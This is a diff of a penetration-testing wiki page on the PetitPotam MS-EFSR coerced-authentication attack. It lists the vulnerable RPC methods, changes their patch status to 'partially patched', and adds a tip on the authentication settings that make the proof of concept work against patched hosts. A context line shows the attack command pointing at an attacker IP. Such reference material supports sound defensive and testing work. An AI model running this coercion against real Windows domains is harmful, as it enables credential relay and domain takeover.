@@ -10,7 +10,7 @@ While the wider implications of this bug, AD-DS-wise, were only suspected, in 20
 
 The following MS-EFSR's methods were detected vulnerable
 
-* `EfsRpcOpenFileRaw` and `EfsRpcEncryptFileSrv` ([patched by Microsoft](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942))
+* `EfsRpcOpenFileRaw` and `EfsRpcEncryptFileSrv` ([partially patched by Microsoft](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942))
 * `EfsRpcEncryptFileSrv`, `EfsRpcDecryptFileSrv`, `EfsRpcQueryUsersOnFile`, `EfsRpcQueryRecoveryAgents`, `EfsRpcRemoveUsersFromFile`, `EfsRpcAddUsersToFile`, `EfsRpcFileKeyInfo`, `EfsRpcDuplicateEncryptionInfoFile`, `EfsRpcAddUsersToFileEx` (unpatched at the time of this article update, 29th December 2021)
 
 ## Practice
@@ -37,6 +37,10 @@ Some tests conducted in lab environments showed that, unlike the [MS-RPRN abuse 
 ```bash
 Petitpotam.py $ATTACKER_IP $TARGET_IP
 ```
+{% endhint %}
+
+{% hint style="success" %}
+For the proof of concept to work, using a proper security provider (`RPC_C_AUTHN_WINNT`) and authentication level (`RPC_C_AUTHN_LEVEL_PKT_PRIVACY`) can  required, especially if the target is patched against MS-EFSR abuse (which doesn't completely mitigate the vulnerability). In both tools mentioned above, this is not enabled by default.
 {% endhint %}
 
 ## Resources
